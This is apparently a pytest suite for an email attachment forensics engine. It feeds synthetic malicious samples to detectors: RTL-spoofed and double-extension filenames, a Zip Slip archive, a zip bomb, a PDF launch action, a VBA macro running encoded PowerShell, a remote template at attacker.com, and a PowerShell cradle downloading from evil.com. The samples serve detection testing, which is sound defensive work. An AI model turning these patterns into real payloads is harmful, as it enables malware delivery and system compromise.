# AUDIT SCRIPT: Attachment Forensics Test Suite
# Importers/Callers: pytest backend/tests/test_attachment_forensics.py
# Affected API: app.services.attachment_analyzer, app.services.attachment_forensics.*
# Data schemas: dict outputs with indicators, risk_level, findings, extracted_iocs
# Verbatim instruction: "Build a production-safe ATTACHMENT STATIC FORENSICS subsystem."

import io
import math
import zipfile
import pytest
from app.services.attachment_analyzer import AttachmentAnalyzer
from app.services.attachment_forensics.file_identifier import FileIdentifier
from app.services.attachment_forensics.archive_forensics import ArchiveForensics
from app.services.attachment_forensics.office_forensics import OfficeForensics
from app.services.attachment_forensics.pdf_forensics import PdfForensics
from app.services.attachment_forensics.executable_forensics import ExecutableForensics
from app.services.attachment_forensics.ioc_extractor import AttachmentIocExtractor


def test_shannon_entropy_calculation():
    """Verify Shannon entropy is accurate for zero, uniform, and high-entropy random-like bytes."""
    assert FileIdentifier.calculate_entropy(b"") == 0.0
    assert FileIdentifier.calculate_entropy(b"AAAAAAA") == 0.0

    # 256 unique bytes has maximum entropy = 8.0
    all_bytes = bytes(range(256))
    assert abs(FileIdentifier.calculate_entropy(all_bytes) - 8.0) < 1e-5


def test_magic_bytes_and_hashes():
    """Verify cryptographic hashes and magic bytes extraction."""
    data = b"Hello, World!"
    meta = FileIdentifier.get_file_metadata(data, "hello.txt")
    assert meta["md5"] == "65a8e27d8879283831b664bd8b7f0ad4"
    assert meta["sha256"] == "dffd6021bb2bd5b0af676290809ec3a53191dd81c7f70a4b28688a362182986f"
    assert meta["magic_bytes"] == "48656c6c"
    assert meta["is_high_entropy"] is False


def test_bidi_override_spoofing():
    """Test Right-to-Left (RTL) override spoofing in attachment filenames."""
    # e.g. "invoice‮cod.exe" looks like "invoiceexe.doc"
    filename = "invoice‮cod.exe"
    attachments = [{
        "filename": filename,
        "content_type": "application/octet-stream",
        "size": 100,
        "raw_bytes": b"dummy content",
        "extension": "exe",
    }]
    result = AttachmentAnalyzer.analyze(attachments)
    assert result["high_risk_count"] == 1
    att = result["attachments"][0]
    assert "rtl_override_spoofing" in att["indicators"]
    assert att["risk_level"] == "malicious"


def test_double_extension_detection():
    """Detect camouflage extensions like invoice.pdf.exe."""
    attachments = [{
        "filename": "urgent_statement.pdf.exe",
        "content_type": "application/x-msdownload",
        "size": 2048,
        "raw_bytes": b"MZ\x90\x00\x03\x00\x00\x00",
        "extension": "exe",
    }]
    result = AttachmentAnalyzer.analyze(attachments)
    assert result["high_risk_count"] == 1
    att = result["attachments"][0]
    assert "double_extension" in att["indicators"]
    assert att["risk_level"] == "malicious"


def test_executable_magic_mismatch():
    """Detect MZ header masquerading as a benign document."""
    attachments = [{
        "filename": "normal_document.docx",
        "content_type": "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
        "size": 1024,
        "raw_bytes": b"MZ\x90\x00\x03\x00\x00\x00" + b"\x00" * 100,
        "extension": "docx",
    }]
    result = AttachmentAnalyzer.analyze(attachments)
    att = result["attachments"][0]
    assert "executable_magic_mismatch" in att["indicators"]
    assert att["risk_level"] == "malicious"


def test_archive_zip_slip_traversal():
    """Detect Zip Slip path traversal attempt inside an archive."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("../../etc/passwd", "root:x:0:0:root:/root:/bin/bash")
    zip_bytes = buf.getvalue()

    attachments = [{
        "filename": "payload.zip",
        "content_type": "application/zip",
        "size": len(zip_bytes),
        "raw_bytes": zip_bytes,
        "extension": "zip",
    }]
    result = AttachmentAnalyzer.analyze(attachments)
    att = result["attachments"][0]
    assert "zip_slip_path_traversal" in att["indicators"]
    assert att["risk_level"] == "malicious"


def test_archive_executable_inside():
    """Detect dangerous executable files packaged inside a zip."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("installer.exe", b"MZ" + b"\x00" * 20)
    zip_bytes = buf.getvalue()

    attachments = [{
        "filename": "bundle.zip",
        "content_type": "application/zip",
        "size": len(zip_bytes),
        "raw_bytes": zip_bytes,
        "extension": "zip",
    }]
    result = AttachmentAnalyzer.analyze(attachments)
    att = result["attachments"][0]
    assert "executable_in_archive" in att["indicators"]
    assert att["risk_level"] == "malicious"


def test_archive_zip_bomb_detection():
    """Detect zip bomb with huge compression ratio."""
    buf = io.BytesIO()
    # 2 MB of zeros compresses to ~2 KB (>1000:1 ratio and >1MB uncompressed)
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("bomb.txt", b"\x00" * 2_000_000)
    zip_bytes = buf.getvalue()

    attachments = [{
        "filename": "huge_bomb.zip",
        "content_type": "application/zip",
        "size": len(zip_bytes),
        "raw_bytes": zip_bytes,
        "extension": "zip",
    }]
    result = AttachmentAnalyzer.analyze(attachments)
    att = result["attachments"][0]
    assert "zip_bomb_ratio_detected" in att["indicators"]
    assert att["risk_level"] == "malicious"


def test_pdf_forensics_suspicious_actions():
    """Detect PDF launch actions, JS, and embedded files."""
    pdf_content = (
        b"%PDF-1.7\n"
        b"1 0 obj << /Type /Catalog /OpenAction 2 0 R /EmbeddedFiles 3 0 R >> endobj\n"
        b"2 0 obj << /Type /Action /S /Launch /F (cmd.exe) >> endobj\n"
        b"3 0 obj << /Type /Filespec /F (malware.exe) >> endobj\n"
    )
    indicators = PdfForensics.inspect(pdf_content)
    assert "pdf_open_action" in indicators
    assert "pdf_launch_action" in indicators
    assert "pdf_embedded_files" in indicators

    result = AttachmentAnalyzer.analyze([{
        "filename": "invoice.pdf",
        "content_type": "application/pdf",
        "size": len(pdf_content),
        "raw_bytes": pdf_content,
        "extension": "pdf",
    }])
    att = result["attachments"][0]
    assert att["risk_level"] == "malicious"


def test_office_ooxml_vba_macro_and_keywords():
    """Detect OOXML VBA project with suspicious powershell execution keywords."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", "<Types></Types>")
        zf.writestr("word/vbaProject.bin", b"Sub AutoOpen()\nCreateObject(\"WScript.Shell\").Run \"powershell.exe -enc AAAA\"\nEnd Sub")
    ooxml_bytes = buf.getvalue()

    indicators = OfficeForensics.inspect_ooxml(ooxml_bytes)
    assert "ooxml_embedded_vba_macro" in indicators
    assert "office_suspicious_powershell" in indicators
    assert "office_suspicious_wscript" in indicators

    result = AttachmentAnalyzer.analyze([{
        "filename": "order.docm",
        "content_type": "application/vnd.ms-word.document.macroEnabled.12",
        "size": len(ooxml_bytes),
        "raw_bytes": ooxml_bytes,
        "extension": "docm",
    }])
    att = result["attachments"][0]
    assert "ooxml_embedded_vba_macro" in att["indicators"]
    assert att["risk_level"] in ("suspicious", "malicious")


def test_office_external_template_injection():
    """Detect remote template injection in OOXML relationship files."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        rel_content = (
            '<?xml version="1.0" encoding="UTF-8"?>\n'
            '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">\n'
            '  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"\n'
            '    Target="http://attacker.com/malicious_template.dotm" TargetMode="External"/>\n'
            '</Relationships>'
        )
        zf.writestr("word/_rels/settings.xml.rels", rel_content)
    ooxml_bytes = buf.getvalue()

    indicators = OfficeForensics.inspect_ooxml(ooxml_bytes)
    assert "ooxml_external_template_or_link" in indicators


def test_executable_pe_suspicious_imports():
    """Detect PE header and suspicious injection API imports."""
    pe_bytes = b"MZ\x90\x00" + b"\x00" * 60 + b"VirtualAlloc\x00WriteProcessMemory\x00CreateRemoteThread\x00"
    indicators = ExecutableForensics.inspect_pe(pe_bytes)
    assert "executable_pe_header" in indicators
    assert "pe_suspicious_import_VirtualAlloc" in indicators
    assert "pe_suspicious_import_WriteProcessMemory" in indicators
    assert "pe_suspicious_import_CreateRemoteThread" in indicators


def test_script_forensics():
    """Detect obfuscation and download cradles in script files."""
    ps1_code = b"$c = IWR -Uri 'http://evil.com/drop.exe'; powershell.exe -ExecutionPolicy Bypass -EncodedCommand AAAA"
    indicators = ExecutableForensics.inspect_script(ps1_code, "ps1")
    assert "script_suspicious_powershell_keywords" in indicators

    vbs_code = b"eval(unescape('%72%75%6e'))"
    vbs_indicators = ExecutableForensics.inspect_script(vbs_code, "vbs")
    assert "script_suspicious_obfuscation" in vbs_indicators


def test_attachment_ioc_extraction_with_provenance():
    """Extract embedded URLs and IPs with provenance metadata."""
    content = b"Please check http://malicious-c2.example.com/login and server at 198.51.100.42 for config."
    iocs = AttachmentIocExtractor.extract_iocs(content, "notes.txt", "att_001")

    url_iocs = [i for i in iocs if i["type"] == "url"]
    ip_iocs = [i for i in iocs if i["type"] == "ipv4"]

    assert len(url_iocs) == 1
    assert url_iocs[0]["value"] == "http://malicious-c2.example.com/login"
    assert url_iocs[0]["provenance_class"] == "OBSERVED"
    assert url_iocs[0]["parent_filename"] == "notes.txt"

    assert len(ip_iocs) == 1
    assert ip_iocs[0]["value"] == "198.51.100.42"
    assert ip_iocs[0]["confidence"] == 85


def test_corrupt_attachment_safe_handling():
    """Verify corrupted or truncated payloads do not crash the engine."""
    corrupted_zip = b"PK\x03\x04\x00\x00\x00\x00garbage_data"
    result = AttachmentAnalyzer.analyze([{
        "filename": "corrupt.zip",
        "content_type": "application/zip",
        "size": len(corrupted_zip),
        "raw_bytes": corrupted_zip,
        "extension": "zip",
    }])
    assert len(result["attachments"]) == 1
    assert result["attachments"][0]["filename"] == "corrupt.zip"
